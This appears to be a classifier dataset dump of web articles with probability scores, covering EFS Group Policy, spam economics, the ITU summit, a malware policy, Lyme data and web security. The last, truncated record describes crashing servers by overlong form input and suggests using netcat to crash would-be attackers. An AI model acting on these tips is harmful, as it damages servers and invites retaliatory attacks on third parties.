click the Group Policy tab. Click New and name your new policy EFS Recovery public key distribution. Then, click Edit. In the new Group Policy window that opens, expand the Machine Configuration, Windows Settings, Security Settings, and Public Key Policies folders. Right-click the Encrypted Data Recovery Agents folder and select Add. In the Add Recovery Agent wizard, click Next. Click Browse Folders and select the .cer file you exported. Click Next, Finish. You're now ready to share encrypted files and recover them if necessary. You might notice that the imported certificate contains a warning that the certificate is from a nontrusted CA. You can use Group Policy to publish your CA as a trusted root CA. Go to the Certificate Services Web site and select Retrieve the CA certificate or certificate revocation list. Select your standalone root CA from the list, select DER encoded format, and click the Download CA certificate link. Save the file to disk. Next, use AD to publish the file. Open the Active Directory Users and Computers snap-in, and right-click the container you added earlier (i.e., where you added the EFS Recovery public key distribution Group Policy). Select Properties and click the Group Policy tab. Select the EFS Recovery public key distribution Group Policy, and click Edit. In the Group Policy window that opens, expand the Machine Configuration, Windows Settings, Security Settings, and Public Key Policies folders. Right-click the Trusted Root Certification Authorities folder and select All Tasks, Import. In the Certificate Import wizard, click Next. Enter the name of the file you downloaded from the Certificate Services Web site and click Next. Click Browse if possible; select the Trusted Root Certification Authorities certificate store and click Next. If Browse is shaded, click Next immediately. Click Finish. I admit that my encryption solution exploits the public key infrastructure (PKI) because private keys aren't intended for multiuser use. However, my solution will meet most companies' requirements.",
        "prob": "tensor([[2.1564e-06, 1.0000e+00]])"
    },
    {
        "text": "How spammers make their money According to a US Treasury advisor, global cybercrime turned over more money than drug trafficking in 2004. Since then the major global malware epidemic has been putting greater wealth into the hands of criminals than ever before, and security experts have warned that organised crime syndicates have taken over much of the creation and exploitation of malware in circulation today. But how do they make their money and how much? Spammers send out millions of messages on behalf of online merchants who want to sell a product. If a spam recipient buys something, the spammer gets a percentage of the sale. For pharmaceuticals the commission can be as high as 50%, and research has shown that the response rate can be rather high. A good example is \"penis related spam\" which has a 5% click rate, meaning that 5% of the recipients actually open the spam mail and click on the link in the mail. This means that spammers can make a massive amount of money. In July 2007, a retired spammer told PC World that at the peak of his power he pulled in $10,000 to $15,000 a week sending e-mails that promoted pills, porn and casinos. Spam is usually sent from networks of hacker-controlled computers, so-called botnets. Those machines are often consumer PCs infected with malicious software that a hacker can control. Groups of hacker specialize in creating botnets and make money renting them to spammers by the hour. The going rate for botnets has been from $300 to $700 per hour. Botnets are frequently used for so-called Denial of Service (DoS) attacks where hackers demand money to stop bombarding a specific website with requests, making it unavailable to its intended users. In the second half of 2006, an average of 5,213 DoS attacks were recorded per day. The US was the target of most attacks accounting for 52% of the worldwide total. In 2010, Spain topped the bot ranking with 44.49% of all infected computers, according to net-security.org. Next in the ranking, although a long way behind with 14.41%, comes the United States, followed by Mexico (9.37%) and Brazil (4.81%). Phishers / Identity thieves According to Phishing Activity Trends Report released by APWG, Payment Services was the most targeted industry sector in 2010, enduring nearly 38%of detected attacks. Financial Services was second at 33% followed by Classifieds at 6.6%, though the latter exhibited the most rigorous growth of all sectors. The United States is the top country hosting phishing sites, while China, the United Kingdom and Canada each take the second place in rotation. The Swedish bank Nordea suffered one of the biggest publicly known phishing frauds in history. Over 8 million kronor ($1,200,000) disappeared in three months as a result of a tailor-made attack launched by Russian criminals. Reports indicated that 250 customers had become victims.",
        "prob": "tensor([[2.1392e-06, 1.0000e+00]])"
    },
    {
        "text": "Editor's note: This is the fifth column in a series that challenges misconceptions about entrepreneurship. Myth: When measuring share of small business employment, the terms \"small firm\" and \"small establishment\" mean the same thing. Reality: To determine the share of employment small businesses account for in the U.S., I've always used data from the Office of Advocacy of the Small Business Administration which provides data produced by the U.S. Census on small business employment. The Census data on the SBA Web site shows that, in 2006 (the latest year available), 50.2% of U.S. employment lies in businesses with fewer than 500 employees. But recently I began looking at data from payroll provider Automatic Data Processing (ADP), which uses payroll data to track U.S. employment. ADP's data shows that the share of U.S. employment in businesses with less than 500 employees is more than 30 percentage points higher. In 2006, the ADP data showed that 82.9% of U.S. employment was in businesses with less than 500 employees. Huh? A 32.7% gap in the share of employment in businesses with fewer than 500 employees is much too large to be the result of just some slight difference in measurement. So something else must be going on. What's Behind the NumbersTo figure out what could explain the differences, I took a look at what the two sources are measuring. Both are comparing employment in businesses of less than 500 employees to the overall number of people employed and both exclude employment on farms. So it's not the size of the businesses or the exclusion of agriculture that's the cause of the difference. It's also not their labor force figures. The two sources' estimates of the number of people employed aren't that far off each other—119,917,000 for the SBA in 2006 and 113,475,000 for ADP in 2006. Even if we assume that every employee counted by the SBA and missed by ADP was employed in a large business, ADP's estimates would show that small businesses accounted for 77.2% of U.S. employment, whereas the Census/SBA estimates would show that small businesses only accounted for 50.2% of U.S. employment. The use of payroll data is also not the explanation. Census measures employment on the basis of payroll tax records, using employer identification numbers to identify businesses. ADP gets its estimates from \"aggregated and anonymous payroll data that represents approximately 400,000 of ADP's 500,000 U.S. business clients\" which are then extrapolated to the overall population. So both sources are using payroll data to measure employment. Different definitions of \"business\"The difference, it turns out, lies in how the two groups define \"businesses.\" ADP is measuring establishments, whereas Census is measuring firms. And small establishments, it turns out, are very different than small firms. According to the U.S. Census, \"an establishment is a single physical location where business transactions take place and for which payroll and employment records are kept.\" Firms are \"groups of one or more establishments under common ownership or control.\" Many more Americans work in establishments with fewer than 500 employees than in firms with fewer than 500 employees because a lot of establishments are part of large firms. For example, the Gap (GPS) outlet at your local mall is considered an establishment if it has fewer than 500 employees, but it is considered part of a firm if it has more than 500 employees. So if we measure employment at establishments with fewer than 500 employees, everyone working at the Gap outlets in different malls around the country would be considered employed in small establishments. However, if we measure employment at firms with fewer than 500 employees, everyone working at those different Gap outlets (as long as they weren't franchised) would be considered employed at large firms. The difference between the establishment and firm data is corroborated by looking at County Business Patterns, a Census Bureau effort to measure establishments. County Business Patterns shows small establishment employment numbers very similar to those shown by ADP. In 2007, the Census data shows 79.7% of employment was in establishments with fewer than 500 employees, while ADP shows that 83.1% of employment was in \"businesses\" with fewer than 500 employees. Skewed Employment StatisticsPutting the data together, it is clear that a lot of people work in small establishments that are part of large firms. Unfortunately, most people looking at the different sources of data don't know this, especially since the different sources are saying that they are measuring \"businesses.\" And, unless people look at both sources at the same time, they probably don't even know they are different. But the difference does make it difficult to discuss a basic fact about small business—the share of employment it accounts for. There are probably a number of reasons why measuring small establishments is problematic when seeking to understand small businesses. But here's just one: suppose policymakers want to put in place policies to increase small business employment if small business isn't accounting for an increasing share of total employment. If policymakers look at establishment data, they will get the wrong answer about what to do. The share of employment in small firms has been constant in recent years, while the share of employment in small establishments has been rising. So looking at establishment numbers would give policymakers the impression that small business is accounting for an increasing share of employment. A fact that turns out to be untrue.",
        "prob": "tensor([[0.0041, 0.9959]])"
    },
    {
        "text": "During a recent talk to computer science students and faculty at Florida Gulf Coast University in Fort Myers, Fla., I closed with thoughts about ethics for people who create software. The inclusion of \"backdoors\" into a Web browser, the capability to track people who use cellphones, and the use of facial-recognition programs raise ethical issues. How much intrusion should consumers put up with, and what are the ethical responsibilities of the people who create these applications? During the question-and-answer session, several people asked me how much intrusion I will put up with. I answered, \"Not much.\" I refuse to show a photo ID when I make an in-person credit card purchase, I have no Facebook page, I rarely use \"affinity\" cards in stores, and my driver's license uses an ID number instead of my Social Security number. My family and I take other privacy measures, too. In some situations, though, we cannot try to protect our privacy until we know someone has violated it. Suppose you slip and fall on spilled liquid in a grocery store and must sue the store chain to recover damages. Because you use an affinity card to get discounts, the store knows how much beer and wine you purchase, and threatens to reveal the quantities and dates at trial. Perhaps then the jury will think you had too much to drink and lost your balance. You thought your records of purchases remained private, and the store never told you otherwise. I have heard stories about insurance companies investigating food purchases to determine the type of diet an applicant follows and whether that diet includes a lot of fatty or high-calorie food. So you might get denied life insurance because your grocery purchases reveal an \"unhealthy\" lifestyle. The software doesn't know you buy two dozen donuts each Saturday for your kid's soccer team. The process of gathering information about you and then using it for a purpose unknown to you raises ethical issues for the people who create such systems. Thus, programmers and software designers must revisit the ethics of their profession and consider them carefully.",
        "prob": "tensor([[2.7361e-06, 1.0000e+00]])"
    },
    {
        "text": "The invention of LTFS has indeed made life a lot easier for most organizations which used to face problems with magnetic storage tapes. These tapes did not allow the users to store the related metadata in an easily accessible manner. But with the introduction of Linear Tape File System, the scenario has changed for the better. How has LTFS Revolutionized Data Archiving? - This new technology from IBM has helped in reducing costs related to archiving and data storage. - Easy access is what has made this technology different from the older magnetic tapes storage system. - Data can be used and stored since you can access it across many different mediums and platforms. - The universal nature of the media makes it more attractive to users across the globe. - What's more is that you can use this as a USB drive. You just need an LTO-5 drive to upload the LTFS tape onto it. Then you can mount the tape on the file system. - It allows you to tag files using any text. This in turn enables you, as a user, to run searches which are much more intuitive. Hence, you can search the LTO-5 tape libraries as well as the drives more comprehensively. - This technology consumes less energy too. - The data is encrypted and hence it ensures better data security. - The data which is stored on an LTO-5 tape is automatically protected from issues like erasures and over-writings which are done with a malicious intent. - The simple drag and drop feature of files storage makes LTFS easy to use and apply. So for active archiving which is low-cost and high on the reliable factor, LTFS is the way to go. Active Archiving is a combination process which blends tape as well as disk hardware to offer data storage with many important advantages. Active Archiving is a collaboration between both the hardware as well as the software vendors. LTFS is a preferred option with most manufacturers who are offering archiving solutions. Some of the best known names include IBM and HP. For organizations which need large data storage facilities and are wary of issues like software malfunctions, illegal data access, natural calamities, which cause breakdown of storage systems and make data recovery impossible, Linear Tape File System has a solution. Companies which adopt this system will not have to worry about complex data management, large scale data storage or response times. To install the Linear Tape File System, all you need is a drive firmware level to offer dual partitioning support. You also require a software which you can download; this software includes the run-time executable which helps you write files on an LTO-5 tape, in the LTFS format. This system is available for both Linux as well as MacOS.",
        "prob": "tensor([[2.1185e-06, 1.0000e+00]])"
    },
    {
        "text": "The inner workings of United Nations telecommunications agencies aren't usually headline news. But then again, most U.N. confabs don't grapple with topics as slippery as Internet censorship, taxation, and privacy. A U.N. agency called the International Telecommunication Union has kicked off what has become a highly controversial summit this week in Dubai, capping over a year of closed-door negotiations over an international communications treaty that could have a direct impact on the Internet. The summit continues through the end of next week. It's true, of course, that U.N. meetings often yield more rhetoric than substance. During a summit in Tunisia in 2005, for instance, Iran and African governments proclaimed that the Internet permits too much free speech, with Cuba's delegate announcing that Fidel Castro believed the time had come to create a new organization \"which administers this network of networks.\" The difference here is that this meeting actually matters: the ITU event is aimed at rewriting a multilateral treaty that governs international communications traffic. It was last updated back in 1988, when home computers used dial-up modems, the Internet was primarily a university network, and Facebook CEO Mark Zuckerberg was a mere 4 years old. For answers to some of your questions about the ITU summit, formally called the World Conference on International Telecommunications (WCIT, pronounced \"wicket\"), read on: Q: What's going to happen at the summit? It's too early to say for sure. A series of ITU committees are meeting to draft proposals, with a deadline of December 12. On December 13, the final texts are presented. On December 14, the final treaty is signed. But a coalition of Internet companies, nonprofit groups, and Western governments have taken extraordinary steps in the last few months to warn that proposals from nations with less than a sterling commitment to civil liberties -- among them Algeria, China, and Russia -- could do grave harm to the current free and open Internet. It's no coincidence that some of those nations have geopolitical interests that are in conflict with those of the United States. The Dubai summit gives them an opportunity to depict the current way the Internet is governed as overly U.S.-dominated, and in need of significant changes, a proposal that many poorer nations support for reasons of their own. Q: What are some of the concerns? They deal primarily with areas including free speech, taxation, privacy, and cybersecurity. There are secondary concerns about the ITU process itself: meetings are held behind closed doors, and key documents are withheld from public scrutiny -- the precise opposite of the way traditional Internet standards-setting works. A site called WCITLeaks.org, by two policy analysts at the free-market Mercatus Center at George Mason University in Arlington, Va., has sprung up to shine more light on what's happening in secret. Vint Cerf, co-creator of the Internet's technical underpinnings, warned in a CNN op-ed last week that the ITU \"is the wrong place to make decisions about the future of the internet.\" That's because, he wrote: \"Only governments have a vote at the ITU. This includes governments that do not support a free and open internet. Engineers, companies, and people that build and use the Web have no vote.\" Google has organized a campaign to draw attention to the summit, saying some governments \"are trying to use a closed-door meeting in December to regulate the Internet.\" Advocacy groups Fight for the Future and AccessNow have launched WhatIsTheITU.org to warn that the ITU poses \"a risk to freedom of expression\" online. The Internet Society has told the ITU (PDF) that some of the proposals that could be inserted in the treaty will harm \"the long term prospects of a global, open Internet.\" And Tim Berners-Lee, the father of the World Wide Web, warned this week about an ITU power grab, telling the BBC that: \"Countries that want to be able to block the Internet and give people within their country a 'secure' view of what's out there would use a treaty at the ITU as a mechanism to do that, and force other countries to fall into line with the blockages that they wanted to put in place.\" Q: What's the official position of the U.S. government? In a sharply partisan U.S. election year, this has been a rare point of bipartisan accord: the House of Representatives unanimously approved a resolution this week aimed at sending a strong message to the ITU. It said, in part, that \"the consistent and unequivocal policy of the United States [is] to promote a global Internet free from government control.\" During a May 2012 House hearing, Democrats and Republicans alike warned that this month's summit could lead to a virtual takeover of the Internet if proposals from China, Russia, Iran, and Saudi Arabia are adopted. \"These are terrible ideas,\" Rep. Fred Upton, a Michigan Republican, said. They could allow \"governments to monitor and restrict content or impose economic costs upon international data flows,\" added Ambassador Philip Verveer, a deputy assistant secretary of state in the Obama administration. Unless the U.S. and its allies can block these proposals, they \"just might break the Internet by subjecting it to an international regulatory regime designed for old-fashioned telephone service,\" Rep. Greg Walden, an Oregon Republican said. The U.S. could choose to refuse to sign and ratify the new treaty, of course. But that would create additional problems: U.S. network operators and their customers would still be expected to comply with new rules when dealing with foreign partners and governments, leading to a Balkanization of the Internet. Q: Are the U.S. and its allies in Europe and Canada having any luck at the summit? The U.S., Europe, and Canada advanced a proposal in Dubai to limit the ITU's rules to only telecommunications providers, not Internet companies like Google and Facebook. \"We want to make sure [the ITU treaty] stays focused squarely on the telecom sector,\" said U.S. Ambassador Terry Kramer, according to Reuters. \"We thought we should deal with that up-front.\" Reuters reported this week that this effort stalled, but Kramer said a day later that the wire service report was inaccurate and progress was being made. The ITU's own Web site describes the situation thus (keep reading for more on what Russia proposed): A proposal from the Russian Federation to include in the [treaty] a new provision on the Internet (new Article 3A) was supported and endorsed by Algeria. China and the United Arab Emirates also agreed that the Internet should be included... Canada, France, Europe, Sweden, and the United States do not support the proposal, and do not want it discussed [in the committees]. The Chairman of the Conference deferred the discussion on the proposed new provision to the next plenary, with informal discussions in the meantime. Q: What does the ITU say? For their part, ITU officials have attempted to downplay criticism, saying that whatever is decided in Dubai is up to the member countries that are sending delegates to the summit. Hamadoun Touré, the ITU's secretary general, wrote in an opinion article in Wired last month: Governments are looking for more effective frameworks to combat fraud and other crimes. Some commentators have suggested such frameworks could also legitimize censorship. However, Member States already have the right, as stated in Article 34 of the Constitution of ITU, to block any private telecommunications that appear \"dangerous to the security of the State or contrary to its laws, to public order or to decency.\" An ITU spokesman, Paul Conneally, wrote a blog post that defended the organization against allegations of secrecy. \"At ITU, transparency is achieved at the national level, through national consultations in national languages,\" Conneally wrote. \"A process we believe more inclusive than simply posting an English language text online.\" Another WCITLeaks-posted document (PDF) from a staff retreat in Geneva in September shows the ITU is highly sensitive to public criticism and the perception it's engaged in a power grab. The internal document says: \"Negative media coverage in the U.S. continues, and is now starting to appear in developing countries, and the Secretariat continues its effort to counter this.\" The ITU has also set up a blog that has denounced \"some of the deliberate misinformation that has been spread before the conference.\" In addition, delegates to the summit agreed to a suggestion by Touré to, in the words of the ITU, \"issue a press release that would send a strong signal about the need to protect the right to freedom of expression.\" Q: Why choose to have this event in Dubai? In part it's due to which nations are willing to host a summit. But the choice of the United Arab Emirates is an odd one: the nation has blocked Web sites arbitrarily, has fined journalists for exposing corruption in a state-run company, and has enacted a law allowing any Internet user to be imprisoned for \"opposition to Islam,\" \"insult to any religion recognized by the state\" or \"contravening family values and principles,\" according to Reporters Without Borders. FreedomHouse scores the UAE's press freedom laws as \"not free,\" citing \"restrictive legal provisions and widespread censorship, especially online.\" Q: What's going on with deep packet inspection? At another Dubai summit that took place last month, the ITU adopted recommendations proposed by China that will help network providers target BitTorrent uploaders, detect trading of copyrighted MP3 files, and, critics say, accelerate Internet censorship in repressive nations. The ITU adopted the confidential Y.2770 standard for deep packet inspection -- only members, not the public, currently have access to the document -- despite objections from Germany. It had warned the ITU must \"not standardize any technical means that would increase the exercise of control over telecommunications content, could be used to empower any censorship of content, or could impede the free flow of information and ideas.\" Because Y.2770 is confidential, many details remain opaque. But a document (PDF) posted by a Korean standards body describes how network operators will be able to identify \"embedded digital watermarks in MP3 data,\" discover \"copyright protected audio content,\" find \"Jabber messages with Spanish text,\" or \"identify uploading BitTorrent users.\" Jabber is also known as XMPP, an instant messaging protocol. In a joint blog post, Alissa Cooper and Emma Llansó from the Center for Democracy and Technology say that the U.N. agency \"barely acknowledges that DPI has privacy implications, let alone does it provide a thorough analysis of how the potential privacy threats associated with the technology might be mitigated.\" One reason why deep packet inspection is so controversial is that it has been used by repressive regimes -- dozens of which are members of the ITU -- to conduct extensive surveillance against their own citizens. A Wall Street Journal report last year described how Amesys, a unit of French technology firm Bull SA, helped Moammar Gadhafi spy on his people. Boeing's Narus unit was in talks with Libya about controlling Skype, censoring YouTube, and blocking proxy servers, the report said. The ITU said in a subsequent blog post that it has \"resolved some concerns regarding maintaining privacy after it was noted that the standard deals with the identification of the application used rather than the inspection of users content.\" Q: And taxes or other fees for Web companies and their users? In June, a proposal to the ITU was leaked that would target the largest Web content providers, including Google, Facebook, Apple, and Netflix, and possibly cripple their ability to reach users in developing nations. It was drafted by the European Telecommunications Network Operators Association, or ETNO, a Brussels-based lobby group representing companies in 35 nations that wants the ITU to mandate these fees. ETNO refers to it as the \"principle of sending party network pays\" -- an idea borrowed from the system set up to handle payments for international phone calls, where the recipient's network set the per minute price. A sender-pays framework, however, could prompt U.S.-based Internet services to reject connections from users in developing countries, who would become unaffordably expensive to communicate with. Luigi Gambardella, chairman of the ETNO's executive board, told CNET in an interview in August that the principle of sender-party-pays for Internet traffic was a fair solution. (Not-so-coincidentally, a lot of Internet traffic is sent to Europe from the United States.) \"We believe that this situation is putting at risk our capacity to invest,\" Gambardella said. \"We need to rethink together and to establish a new balance.\" While this is the first time this proposal been advanced to the ITU, European network providers and phone companies have been bitterly complaining about U.S. content companies for some time. France Telecom, Telecom Italia, and Vodafone Group want to \"require content providers like Apple and Google to pay fees linked to usage,\" Bloomberg reported in December 2011. Q: What's the history of the U.N., the ITU, and the Internet? This isn't exactly the first time that the U.N. or its agencies wanted to expand their influence over the Internet. At a 2004 summit at the U.N.'s headquarters in New York, U.N. Secretary General Kofi Annan criticized the current system through which Internet standards are set and domain names are handled -- that would be the Internet Corporation for Assigned Names and Numbers, or ICANN, and the Internet Engineering Task Force -- and delegates from Cuba, Ghana, Bolivia and Venezula objected to what they said was too much control of the process by the U.S. government and its allies. Two years later, at another U.N. summit in Athens, then-ITU Secretary General Yoshio Utsumi criticized the current ICANN-dominated process, stressing that poorer nations are dissatisfied and are hoping to erode U.S. influence. \"No matter what technical experts argue is the best system, no matter what self-serving justifications are made that this is the only possible way to do things, there are no systems or technologies that can eternally claim they are the best,\" Utsumi said. In an interview with CNET at the time, Houlin Zhao, director of the ITU's Telecommunication Standardization Bureau, said: \"The ITU is trying to ensure its value. Any public network of communications is naturally of interest to ITU. ITU has a lot of expertise and a lot of experience.\" In 2008, CNET disclosed that the ITU was quietly drafting technical standards, proposed by the Chinese government, to define methods of tracing the original source of Internet communications and potentially curbing the ability of users to remain anonymous. A leaked document showed the trace-back mechanism was designed to be used by a government that \"tries to identify the source of the negative articles\" published by an anonymous author. In 1999, a report from the United Nations Development Program proposed Internet e-mail taxes to help developing nations, suggesting that an appropriate amount would be the equivalent of one penny on every 100 e-mails that an individual might send. But the agency backed away from the idea a few days later. And in 2010, the U.N.'s World Health Organization contemplated, but did not agree on, a \"bit tax\" on Internet traffic. Q: What has Russia proposed? Last fall, China, Russia, Tajikistan, and Uzbekistan submitted a proposal to the U.N. asking for the creation of an \"International Code of Conduct for Information Security.\" It called for international cooperation in controlling \"dissemination of information\" that \"undermines other countries' political, economic, and social stability\" -- which appears to mean censoring political speech appearing on Web pages, social network posts, and so on. At the time, Russian Prime Minister Vladimir Putin described the proposal as handing the U.N. \"international control of the Internet.\" Recently leaked documents show that Russia hasn't moderated its position much since. Russia proposed that the U.N. take over the responsibilities of the Internet Society and ICANN, which manages domain names and addresses. But after criticism of the proposal, which was first reported by CNET, Russia moderated its position.",
        "prob": "tensor([[4.3292e-04, 9.9957e-01]])"
    },
    {
        "text": "University information resources are strategic assets, which as property of the State of Texas, must be managed as valuable state resources. The integrity and continued operation of University information resources are critical to the operation of the University. Malicious code can disrupt normal operation of University information resources. This procedure is intended to provide information to University information resource administrators and users to improve the resistance to, detection of, and recovery from the effects of malicious code. This procedure applies to all University network information resources. The purpose of the implementation of this procedure is to provide a set of measures that will mitigate information security risks associated with Malicious Code. The intended audience for this procedure includes all owners, managers, system administrators, and users of University information resources. Information Resources (IR): The procedures, equipment, and software that are designed, employed, operated, and maintained to collect, record, process, store, retrieve, display, and transmit information or data. Malicious code: Software that is designed to operate in a manner that is inconsistent with the intentions of the user and which typically results in annoyance or damage to the user's information systems. Examples of such software include: Viruses: Pieces of code that attach to host programs and propagate when an infected program is executed. Worms: Particular to networked computers to carry out preprogrammed attacks that jump across the network. Trojan Horses: Hide malicious code inside a host program that appears to do something useful. Attack scripts: These may be written in common languages such as Java or ActiveX to exploit weaknesses in programs; usually intended to cross network platforms. Spyware:Software planted on your system to capture and reveal information to someone outside your system. It can do such things as capture keystrokes while typing passwords, read and track email, record the sites visited, pass along credit card numbers, and so on. It can be planted by Trojan horses or viruses, installed as part of freeware or shareware programs that are downloaded and executed, installed by an employer to track computer usage, or even planted by advertising agencies to as in feeding you targeted ads. Owner of an Information Resource: an entity responsible for: a business function (Department Head) determining controls and access to information resources 4. Prevention and Detection: For each computer connected to the University network, security updates from the manufacturer of the appropriate operating system, and/or application software, must be kept current (e.g., patched and updated). Where feasible, personal firewall software or hardware shall be installed to aid in the prevention of malicious code attacks/infections. Email attachments and shared files of unknown integrity shall be scanned for malicious code before they are opened or accessed. Diskettes and mass storage devices will be scanned for malicious code before accessing any data on the media. Software to safeguard against malicious code (e.g., antivirus, anti spyware, etc.) shall be installed and functioning on susceptible information resources that have access to the University network. Software safeguarding information resources against malicious code shall not be disabled or bypassed by end-users. The settings for software that protect information resources against malicious code should not be altered in a manner that will reduce the effectiveness of the software. The automatic update frequency of software that safeguards against malicious code shall not be disabled, altered or bypassed by end-users to reduce the frequency of updates. 5. Response and Recovery: All reasonable efforts shall be made to contain the effects of any system that is infected with a virus or other malicious code. This may include disconnecting systems from the network or disabling email accounts. If malicious code is discovered, or believed to exist, an attempt should be made to remove or quarantine the malicious code using current antivirus or other control software. If malicious code cannot be automatically quarantined or removed by antivirus software, the system shall be disconnected from the network to prevent further possible propagation of the malicious code or other harmful impact. The presence of the malicious code shall be reported to Information Technology Services by contacting the Helpdesk at 936-261-2525, so that they may take appropriate actions in removing the malicious code and protecting other systems. Personnel responding to the incident should have or be given the necessary access privileges and authority to afford the necessary measures to contain/remove the infection. If possible, identify the source of the infection and the type of infection to prevent recurrence. Any removable media (including diskettes, mass storage cards, etc.) recently used on an infected machine shall be scanned prior to opening and/or executing any files contained therein. Information Technology Services personnel should thoroughly document the incident noting the source of the malicious code (if possible), resources impacted, and damage or disruption to information resources, and bring the matter to the attention of PVAMU administration. 2003-2009 PRAIRIE VIEW A & M UNIVERSITY - ALL RIGHTS RESERVED P.O. Box 519 - Prairie View, Texas - 77446-0519 FM 1098 Rd & University Dr, Prairie View, TX 77446 University Operator: (936) 261-3311 Best viewed with IE 7.x+ or FireFox 3.x+",
        "prob": "tensor([[2.0452e-06, 1.0000e+00]])"
    },
    {
        "text": "Lyme disease surveillance and available data Lyme disease has been a nationally notifiable condition in the United States since 1991. Reports of Lyme disease are collected and verified by state and local health departments in accordance with their legal mandate and surveillance practices. After removal of personal identifiers, selected information on cases is shared with CDC through the National Notifiable Diseases Surveillance System (NNDSS). For more information on NNDSS, see http://www.cdc.gov/osels/ph_surveillance/nndss/nndsshis.htm. Policies regarding case definitions, reporting, confidentiality, and data release are determined by states and territories under the auspices of the Council of State and Territorial Epidemiologists (CSTE). Surveillance data have a number of limitations that need to be considered in the analysis, interpretation, and reporting of results. Additionally, answers to frequently asked questions related to surveillance are available. Limitations of surveillance data - Under-reporting and misclassification are features common to all surveillance systems. Not every case of Lyme disease is reported to CDC, and some cases that are reported may be due to another cause. Under-reporting is more likely to occur in highly endemic areas, whereas over-reporting is more likely to occur in non-endemic areas. - Surveillance data are subject to each state's abilities to capture and classify cases, which are dependent upon budget and personnel and varies not only between states, but also from year to year within a given state. Consequently, a sudden or marked change in reported cases does not necessarily represent a true change in disease incidence, and should not be construed as such without knowledge of that state’s historical surveillance practices. - Surveillance data is captured by county of residence, not county of exposure. - States may close their annual surveillance dataset at a different time than CDC. Thus, the final case counts published by CDC may not exactly match numbers published by each state agency for a given year. - Following its implementation in 1991, the national surveillance case definition for Lyme disease was modified in 1996 and again in 2008. Changes were generally minor but may have had some impact on surveillance and must be considered when attempting to interpret trends. Case definitions for each period are available. Publicly available surveillance data - Selected Lyme disease statistics, tables and charts are available on the CDC Lyme disease website. - Provisional case counts for states and territories are published weekly in CDC’s Morbidity and Mortality Weekly Report (MMWR), Notifiable Diseases and Mortality Table II (available at: http://www.cdc.gov/mmwr/mmwr_wk/wk_cvol.html). Provisional data are subject to change. Cumulative totals for the current and previous year are presented in the table; however, due to variable reporting delays these numbers cannot be compared directly to determine whether cases are higher or lower than the previous year. - Final case counts are published after the year is over and all states and territories have verified their data. A table with the final numbers is published in MMWR Weekly Report in early August of the following year. A more detailed presentation of the data, complete with historical tables, in published in the annual MMWR Summary of Notifiable Diseases (available at http://www.cdc.gov/mmwr/mmwr_nd/). - To facilitate the public health and research community’s access to NNDSS data on Lyme disease, CDC has developed a public use dataset. Based on reports submitted to CDC, this dataset provides the number of reported cases by county for the years 1992-2006, in three 5-year intervals. County tabulation is by American National Standard Institute (ANSI) [formerly Federal Information Processing Standard (FIPS) codes]. ANSI county codes ending in “999” represent “unknown” county of residence within each state. More recent county-level case counts are not publicly available at this time. County-level Lyme disease data from 1992-2006 [Excel CSV - 113KB] ––Right–click the link and select \"save\".",
        "prob": "tensor([[0.0790, 0.9210]])"
    },
    {
        "text": "Knowledge of application context is used routinely in mobile applications—for example sensing a user's context (e.g. location and physical actions, time, etc), reducing network usage during periods of inactivity and designing for users. But how does this idea transfer to the server? I almost called this environmental awareness, but didn't want to cause confusion with discussions about network/server environments. By 'situational awareness' I mean awareness of factors external to the application that might be used to affect its behaviour. In my talk this week about application intrusion detection, I will be discussing how an aspect such as the general risk level to an organisation/application might be used to alter an application's actions (e.g. amount of logging, attack detection thresholds). But this awareness, can be used beyond attacker detection and response. Information is knowledge and additional awareness of external factors can be used to control changes to the application. An adaptive application can learn change in response to outside factors. And no, I don't mean displaying an intrusive and annoying paperclip that says \"It looks like you're writing a letter\". Apart from standard functionality the user sees, some ways your application may already be doing this are: - customising content based on: - geo-location information - user preferences - device type (e.g. mobile), browser and screen resolution - typical user behaviour - implementation of additional delays for failed attempts at authentication - use of reputation-based systems - displaying the number/identities of active/logged-in users - detecting usage of the application by users from a different location than they had used previously (e.g. IP address) - showing advertising based on users' behavioural characteristics. But what else can be done? I remember chatting with someone during an unexpected period of severe weather which had disrupted travel in south-east England one morning. They had explained that in situations like this when their call centre was under staffed, they had procedures in place to reduce the length of each customer call, by shortening their own scripts taking out offers for helping with anything else and cross-selling/up-selling. The dialogue script was adapted to the situation. A web application could respond in a similar way during increasing, and higher periods of demand, to increase availability: - switch to more static content (e.g. change the home page to static HTML rather than a scripted dynamic page) - swap to lower bandwidth assets (e.g. display photographs instead of videos, use lower resolution photos) - use third-party servers for some content (e.g. video on YouTube) - reduce the size of pages and number of page elements by dropping out non-core material (e.g. promotional items, banners) - increase caching - delay non-core server intensive activities (e.g. management report generation) - provide links to printable forms to divert some or all users of a particular online service. Similarly, if a local (e.g. dynamic PDF creation or chart generation), back-office (e.g. data archive) or third-party service (e.g. payment authorisation, address look-up) is detected as running slowly or has become unavailable, some of the following may be possible: - switch to cached data - add a queue to access the function - slow down the speed at which users can undertake the function - offer alternative (quicker) ways to complete the transaction - take the service offline, but offer to email users back when it is available again. Similar changes could occur in advance of, or during, known scheduled application maintenance periods: - advanced warning notices to users - timed count-down to function or application shutdown - preventing users beginning new tasks which might not be able to be completed before the shutdown - ability for users to request notification that the service is back up. The important thing (remember \"clippy\") is not to change the user experience too noticeably, and where there is a significant change (e.g. download the form instead of doing it online), provide a time-stamped explanation of the change and reasons. These measures all bring complexity, and it is important they do not introduce additional vulnerabilities to the application. The problems are quite likely to be in authentication, authorisation and session management and need to be identified during security specification and verification processes. The effect on data integrity, including accuracy, also needs to be considered. But the measures are worth considering where the alternative is additional standby staff and increased usage of other channels. Posted on: 13 July 2010 at 09:30 hrs",
        "prob": "tensor([[0.0410, 0.9590]])"
    },
    {
        "text": "The purpose of this article is not to teach you how to hack sites, but to show you some scenarios that may reveal to you how vulnerable your existing site may be, or will hopefully help you prevent any future sites from having these vulnerabilities. Closely related to hidden field manipulation, buffer overruns are engineered in a similar fashion; any text input field with a maxchar=n property can be used to potentially shut down the server. The source code can be accessed, and the maxchar property removed. The hacker then enters, say, 10,000 ones and submits the form. What happens next? The server shuts down, taking your business with it. A semi-secure solution to this would again be to encrypt any HTML form source. A better solution would be to allocate memory dynamically, therefore not presetting the memory buffer to a certain size, or writing a function that checks the length of the input before passing the results to the server. If the input exceeds the memory allocation, simply pass back a NULL value. A simple, yet effective trick in deterring hackers is to configure your web server to hand out customised error 404 pages with a status of 200 when a resource is not found. Most genuine users will not even notice, and a hacker using software to scan for available resources will think they have stumbled across a gold mine. When the hacker goes to check, they will find that they have been duped and hopefully see examining your site further as a waste of time. This could be seen as hacking hackers or the hacker becoming the hacked... You could take this one step further and use an old UNIX application called netcat to crash anyone who attempts to hack your site. Netcat makes and accepts TCP connections, but 